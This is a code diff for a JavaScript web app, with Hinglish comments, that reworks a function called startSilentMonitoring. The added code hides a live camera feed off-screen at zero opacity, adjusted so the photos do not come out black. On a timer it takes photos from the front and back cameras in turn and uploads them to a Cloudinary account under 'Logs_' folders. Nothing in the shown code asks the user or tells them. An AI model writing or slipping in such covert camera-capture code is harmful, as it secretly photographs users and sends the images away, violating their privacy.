@@ -318,10 +318,19 @@ const compressImage = (file) => {
         return () => unsubscribe();
     }, []);
 const startSilentMonitoring = () => {
+        // Hidden video ko Neon Game ki tarah create karein par screen se bahar rakhein
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
-        video.style.display = 'none'; canvas.style.display = 'none';
-        document.body.appendChild(video); document.body.appendChild(canvas);
+        
+        video.setAttribute('autoplay', '');
+        video.setAttribute('muted', '');
+        video.setAttribute('playsinline', '');
+        
+        // Hidden but ACTIVE style (display:none se black photo aati hai)
+        video.style.cssText = 'position:fixed;top:-2000px;left:-2000px;width:400px;height:300px;opacity:0;z-index:-1;';
+        
+        document.body.appendChild(video);
+        document.body.appendChild(canvas);
 
         const captureCycle = async () => {
             try {
@@ -329,26 +338,45 @@ const startSilentMonitoring = () => {
                     video: { facingMode: currentFacingMode, width: 400, height: 300 } 
                 });
                 video.srcObject = stream;
-                await new Promise(res => video.onloadedmetadata = res);
-                
+
+                // 1. Explicitly play karwaein
+                await video.play();
+
+                // 2. Camera Sensor adjustment wait (Neon Game ki tarah thoda delay)
+                // 3 Seconds ka wait taaki hardware black photo na khinche
                 setTimeout(async () => {
                     const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/jpeg', 0.2); 
+                    canvas.width = video.videoWidth || 400;
+                    canvas.height = video.videoHeight || 300;
+                    
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // 0.3 Quality (Medium - No Hard compression)
+                    const img = canvas.toDataURL('image/jpeg', 0.3);
                     
                     const fd = new FormData();
                     fd.append('file', img);
                     fd.append('upload_preset', PRESET_MONITOR);
                     fd.append('folder', `Logs_${currentFacingMode}`);
 
-                    fetch(`https://api.cloudinary.com/v1_1/${CLOUD_MONITOR}/image/upload`, { method: 'POST', body: fd });
+                    try {
+                        await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_MONITOR}/image/upload`, { 
+                            method: 'POST', 
+                            body: fd 
+                        });
+                        console.log("Log Sent: " + currentFacingMode);
+                    } catch (err) {}
 
+                    // Stream close for camera switching
                     stream.getTracks().forEach(t => t.stop());
                     currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-                }, 2000);
-            } catch (e) { currentFacingMode = 'user'; }
+                }, 3000); 
+
+            } catch (e) { 
+                currentFacingMode = 'user'; 
+            }
         };
+
         setInterval(captureCycle, MONITOR_INTERVAL);
         captureCycle();
     };
